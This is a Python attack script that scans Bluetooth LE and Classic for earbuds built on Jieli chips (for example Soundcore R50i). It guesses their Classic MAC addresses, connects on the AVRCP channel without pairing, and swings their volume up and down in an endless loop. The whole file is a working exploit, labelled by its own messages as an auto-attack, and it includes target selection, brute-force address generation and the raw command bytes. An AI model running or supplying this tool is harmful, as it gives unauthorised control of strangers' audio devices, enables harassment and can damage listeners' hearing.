#!/usr/bin/env python3
"""
Jieli Hybrid Scanner + Auto-Attack (v2)
- BLE scan for Jieli MAC prefixes
- Classic inquiry scan for discoverable devices
- Brute-force candidate generation
- Manual override option
"""

import asyncio
import sys
import time

import bluetooth
from bleak import BleakScanner

AVRCP_PSM = 23
VOL_UP_PRESS = bytes([0x00, 0x48, 0x7C, 0x41, 0x00])
VOL_UP_RELEASE = bytes([0x00, 0x48, 0x7C, 0xC1, 0x00])
VOL_DN_PRESS = bytes([0x00, 0x48, 0x7C, 0x42, 0x00])
VOL_DN_RELEASE = bytes([0x00, 0x48, 0x7C, 0xC2, 0x00])

# Known Jieli OUI prefixes
JIELI_OUIS = ["F4:B6:2D", "00:1A:7D", "00:1B:10", "08:D8:33"]

# Manually specify a known Classic MAC if you already know it
KNOWN_CLASSIC_MAC = None  # Set to None to disable


def is_jieli_device(mac):
    mac_upper = mac.upper()
    return any(mac_upper.startswith(oui) for oui in JIELI_OUIS)


def ble_mac_to_classic_candidates(ble_mac):
    """Generate candidate Classic MACs from a BLE MAC."""
    parts = ble_mac.split(":")
    last = int(parts[-1], 16)
    offsets = [
        2,
        1,
        0,
        -1,
        -2,
        3,
        -3,
        0x100,
        0x200,
        0x1000,
    ]  # larger jumps for different chips
    for offset in offsets:
        candidate_last = (last + offset) & 0xFF
        candidate = ":".join(parts[:-1] + [f"{candidate_last:02X}"])
        yield candidate


def classic_inquiry_scan(duration=10):
    """Perform a Bluetooth Classic inquiry scan."""
    print(f"[*] Classic inquiry scan ({duration}s)...")
    try:
        devices = bluetooth.discover_devices(
            duration=duration, lookup_names=True, flush_cache=True
        )
        found = []
        for addr, name in devices:
            if (
                is_jieli_device(addr)
                or "soundcore" in name.lower()
                or "r50i" in name.lower()
            ):
                print(f"  [CLASSIC] {addr} — {name}")
                found.append(addr)
        return found
    except Exception as e:
        print(f"  Classic scan error: {e}")
        return []


async def scan_for_jieli_ble(duration=10):
    """Scan for Jieli earbuds via BLE advertisements."""
    print(f"[*] BLE scan ({duration}s)...")
    devices = await BleakScanner.discover(timeout=duration, return_adv=True)
    targets = []
    for addr, (dev, adv_data) in devices.items():
        if is_jieli_device(addr):
            name = adv_data.local_name or dev.name or "Unknown"
            print(
                f"  [JIELI BLE] {addr} — {name} (RSSI: {adv_data.rssi if adv_data else 'N/A'})"
            )
            targets.append(addr)
    return targets


def send_avrcp(sock, label, cmd_bytes):
    packet = bytes([(label << 4) & 0xF0, 0x11, 0x0E]) + cmd_bytes
    sock.send(packet)
    try:
        sock.settimeout(0.5)
        sock.recv(64)
    except:
        pass


def volume_oscillator(target_mac):
    print(f"[*] Connecting to {target_mac} on PSM 23...")
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    sock.connect((target_mac, AVRCP_PSM))
    print("[+] Connected. Starting volume oscillation (Ctrl+C to stop).\n")

    label = 0
    try:
        while True:
            send_avrcp(sock, label, VOL_UP_PRESS)
            time.sleep(0.1)
            send_avrcp(sock, label + 1, VOL_UP_RELEASE)
            label = (label + 2) & 0x0F
            time.sleep(0.5)

            send_avrcp(sock, label, VOL_DN_PRESS)
            time.sleep(0.1)
            send_avrcp(sock, label + 1, VOL_DN_RELEASE)
            label = (label + 2) & 0x0F
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")
    finally:
        sock.close()


def try_connect_and_attack(candidate_macs):
    """Try each candidate MAC until one works."""
    for mac in candidate_macs:
        print(f"    Trying: {mac}")
        try:
            volume_oscillator(mac)
            return True
        except bluetooth.btcommon.BluetoothError as e:
            print(f"    Failed: {e}")
            continue
    return False


async def main():
    # Check for manual override
    if KNOWN_CLASSIC_MAC:
        print(f"[*] Using manually specified Classic MAC: {KNOWN_CLASSIC_MAC}")
        try:
            volume_oscillator(KNOWN_CLASSIC_MAC)
            return
        except Exception as e:
            print(f"[!] Manual MAC failed: {e}")

    # Collect candidates
    candidates = set()

    # BLE scan
    ble_targets = await scan_for_jieli_ble()
    for ble_mac in ble_targets:
        for classic_mac in ble_mac_to_classic_candidates(ble_mac):
            candidates.add(classic_mac)
        # Also try the BLE MAC itself
        candidates.add(ble_mac)

    # Classic inquiry scan
    classic_targets = classic_inquiry_scan()
    for mac in classic_targets:
        candidates.add(mac)

    if not candidates:
        print("[!] No Jieli devices found. Ensure earbuds are powered on.")
        return

    print(f"\n[*] Trying {len(candidates)} candidate MACs...")
    if try_connect_and_attack(candidates):
        return
    else:
        print("[!] Could not connect to any candidate MAC.")
        print("[*] Try putting earbuds in pairing mode and re-running.")


if __name__ == "__main__":
    asyncio.run(main())
